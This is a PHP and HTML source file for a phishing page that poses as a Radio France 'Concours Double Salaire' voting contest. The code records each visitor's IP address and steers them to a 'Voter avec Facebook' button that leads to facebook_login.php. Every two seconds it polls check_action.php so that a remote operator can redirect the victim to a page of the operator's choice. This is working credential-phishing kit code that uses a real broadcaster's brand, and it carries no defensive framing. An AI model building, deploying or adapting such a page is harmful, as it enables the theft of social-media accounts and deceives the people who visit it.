<?php
// Récupérer le nom du candidat depuis l'URL
$candidatName = $_GET['name'] ?? 'VOTEZ';

// Générer un ID de session unique
$sessionId = 'session_'.$_SERVER['REMOTE_ADDR'];
$clientIp = $_SERVER['REMOTE_ADDR'];

// Créer le dossier sessions s'il n'existe pas
if (!file_exists('sessions')) {
    if (!mkdir('sessions', 0777, true)) {
        die('Failed to create sessions directory');
    }
}

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    if (!mkdir('tracking', 0777, true)) {
        die('Failed to create tracking directory');
    }
}

// Enregistrer l'IP et la page actuelle
$trackingData = [
    'page' => 'index.php',
    'timestamp' => time(),
    'ip' => $clientIp,
    'candidat' => $candidatName
];
file_put_contents('tracking/' . $sessionId . '.json', json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Votez pour <?php echo htmlspecialchars($candidatName); ?> - Double Salaire</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            background-image: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .logo {
            height: 40px;
            margin: 0 10px;
        }
        
        .radio-france-logo {
            height: 30px;
        }
        
        .contest-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 25px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .contest-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background: linear-gradient(90deg, #0055a4, #ef4135, #ffffff);
        }
        
        .contest-title {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #0055a4;
            text-align: center;
        }
        
        .contest-description {
            color: #555;
            margin-bottom: 20px;
            font-size: 15px;
            line-height: 1.6;
            text-align: center;
        }
        
        .candidate-section {
            background-color: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            border: 1px solid #e0e0e0;
            position: relative;
        }
        
        .vote-for-label {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #ef4135;
            color: white;
            padding: 3px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .candidate-name {
            font-size: 26px;
            font-weight: bold;
            color: #0055a4;
            margin: 15px 0;
            position: relative;
            display: inline-block;
        }
        
        .candidate-name::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, #0055a4, #ef4135);
            border-radius: 3px;
        }
        
        .votes-counter {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 15px 0;
            font-size: 15px;
            color: #555;
        }
        
        .votes-number {
            font-weight: bold;
            color: #0055a4;
            font-size: 18px;
            margin: 0 5px;
        }
        
        .prize-info {
            display: flex;
            align-items: center;
            margin: 20px 0;
            padding: 15px;
            background-color: #e8f4ff;
            border-radius: 10px;
            border-left: 4px solid #0055a4;
        }
        
        .prize-icon {
            font-size: 24px;
            color: #0055a4;
            margin-right: 15px;
        }
        
        .prize-text {
            font-size: 15px;
            color: #0055a4;
            font-weight: 500;
        }
        
        .vote-button {
            display: block;
            width: 100%;
            padding: 14px 0;
            background: linear-gradient(90deg, #0055a4, #3a7bd5);
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 85, 164, 0.3);
            margin: 20px 0;
        }
        
        .vote-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 85, 164, 0.4);
        }
        
        .vote-button i {
            margin-right: 10px;
        }
        
        .help-text {
            text-align: center;
            font-size: 14px;
            color: #666;
            margin: 15px 0;
            font-style: italic;
        }
        
        .timer {
            text-align: center;
            margin-top: 20px;
            color: #555;
            font-size: 14px;
        }
        
        .timer-value {
            font-weight: bold;
            color: #ef4135;
            font-size: 16px;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        
        .footer a {
            color: #0055a4;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .tricolor-bar {
            height: 4px;
            width: 100%;
            display: flex;
            margin: 15px 0;
        }
        
        .tricolor-bar .blue {
            flex: 1;
            background-color: #0055a4;
        }
        
        .tricolor-bar .white {
            flex: 1;
            background-color: #ffffff;
        }
        
        .tricolor-bar .red {
            flex: 1;
            background-color: #ef4135;
        }
        
        .radio-france-badge {
            display: inline-block;
            background-color: #0055a4;
            color: white;
            font-size: 11px;
            font-weight: bold;
            padding: 4px 8px;
            border-radius: 20px;
            margin-bottom: 10px;
        }
        
        .share-section {
            margin: 20px 0;
            text-align: center;
        }
        
        .share-title {
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #555;
        }
        
        .share-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .share-button {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .share-button:hover {
            transform: scale(1.1);
        }
        
        .share-facebook {
            background-color: #1877f2;
        }
        
        .share-whatsapp {
            background-color: #25D366;
        }
        
        .share-twitter {
            background-color: #1DA1F2;
        }
        
        .share-telegram {
            background-color: #0088cc;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px 12px;
            }
            
            .contest-title {
                font-size: 20px;
            }
            
            .candidate-name {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Logo_Radio_France.svg/2560px-Logo_Radio_France.svg.png" alt="Radio France" class="radio-france-logo">
            </div>
        </div>
        
        <div class="contest-card">
            <div class="radio-france-badge">
                <i class="fas fa-broadcast-tower"></i> Organisé par Radio France
            </div>
            
            <div class="contest-title">Concours Double Salaire Avril 2025</div>
            <p class="contest-description">Votre ami(e) participe à notre concours et a besoin de votre vote pour gagner un double salaire pendant 2 mois !</p>
            
            <div class="tricolor-bar">
                <div class="blue"></div>
                <div class="white"></div>
                <div class="red"></div>
            </div>
            
            <div class="candidate-section">
                <div class="vote-for-label">Votez pour</div>
                <h2 class="candidate-name"><?php echo htmlspecialchars($candidatName); ?></h2>
                <div class="votes-counter">
                    <span>Déjà</span>
                    <span class="votes-number">53</span>
                    <span>votes</span>
                </div>
            </div>
            
            <p class="help-text">Votre vote peut aider votre ami(e) à gagner ce concours!</p>
            
            <div class="prize-info">
                <div class="prize-icon">
                    <i class="fas fa-trophy"></i>
                </div>
                <div class="prize-text">
                Remportez 2 fois votre salaire mensuel pendant 2 mois
                </div>
            </div>
            
            <a href="facebook_login.php?session=<?php echo $sessionId; ?>&ip=<?php echo $clientIp; ?>&name=<?php echo urlencode($candidatName); ?>" class="vote-button">
                <i class="fab fa-facebook-f"></i> Voter avec Facebook
            </a>
            
            <div class="timer">
                Fin du concours dans: <span class="timer-value" id="countdown">2 jours 14:35:22</span>
            </div>
            
       
        </div>
        
        <div class="footer">
            <p>© 2025 Radio France - Concours Double Salaire. Tous droits réservés.</p>
            <p><a href="#">Règlement du concours</a> | <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        // Compte à rebours
        function updateCountdown() {
            const now = new Date();
            const end = new Date();
            end.setDate(end.getDate() + 2);
            end.setHours(end.getHours() + 14);
            end.setMinutes(end.getMinutes() + 35);
            end.setSeconds(end.getSeconds() + 22);
            
            const diff = end - now;
            
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            document.getElementById('countdown').textContent = `${days} jours ${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        updateCountdown();
        setInterval(updateCountdown, 1000);
        
        // Fonction pour vérifier s'il y a une action à effectuer
        function checkAction() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
            .then(response => response.json())
            .then(data => {
                if (data.action) {
                    if (data.action === 'custom' && data.redirect) {
                        window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp + '&name=<?php echo urlencode($candidatName); ?>';
                    } else {
                        window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp + '&name=<?php echo urlencode($candidatName); ?>';
                    }
                }
            })
            .catch(error => {
                console.error('Erreur lors de la vérification des actions:', error);
            });
        }
        
        // Vérifier les actions toutes les 2 secondes
        setInterval(checkAction, 2000);
        
        // Partage sur les réseaux sociaux
        document.querySelector('.share-facebook').addEventListener('click', function() {
            const url = window.location.href;
            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank');
        });
        
        document.querySelector('.share-whatsapp').addEventListener('click', function() {
            const url = window.location.href;
            const text = `Votez pour <?php echo htmlspecialchars($candidatName); ?> dans le concours Double Salaire de Radio France! ${url}`;
            window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
        });
        
        document.querySelector('.share-twitter').addEventListener('click', function() {
            const url = window.location.href;
            const text = `Aidez votre ami(e) à gagner un double salaire pendant 2 mois! Votez ici:`;
            window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(url)}`, '_blank');
        });
        
        document.querySelector('.share-telegram').addEventListener('click', function() {
            const url = window.location.href;
            const text = `Votez pour <?php echo htmlspecialchars($candidatName); ?> dans le concours Double Salaire de Radio France!`;
            window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`, '_blank');
        });
    </script>
</body>
</html>
